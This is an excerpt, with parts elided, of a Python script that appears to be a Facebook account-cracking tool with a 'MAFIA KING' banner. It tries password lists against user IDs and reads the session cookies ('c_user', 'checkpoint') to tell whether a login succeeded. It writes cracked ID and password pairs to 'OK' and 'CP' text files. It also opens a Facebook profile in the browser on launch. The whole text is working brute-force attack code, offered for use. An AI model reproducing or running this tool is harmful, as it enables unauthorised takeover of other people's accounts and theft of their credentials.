...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('xdg-open https://www.facebook.com/mauladad.haydar')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
##     ## ####### ##     ## ##    ## 
\33[1;37m----------------------------------------------
→   Owner      :  Race Arckan MAFIA KING 💪
→   Facebook   :  SN JAN Race Arckan
→   Github     : SN Race Arckan
  →   Tools   :  RANDOM 
...
def riaz():
	...
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/mauladad.haydar');riaz()
	if riaz1 =='2':
		bangla()
	else:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SN.Race Arckan-OK] '+cid+'|'+ps+'\033[0;97m')
                open('SN.Race Arckan-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SN.Race Arckan-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SN.Race Arckan-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mSN.Race Arckan\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
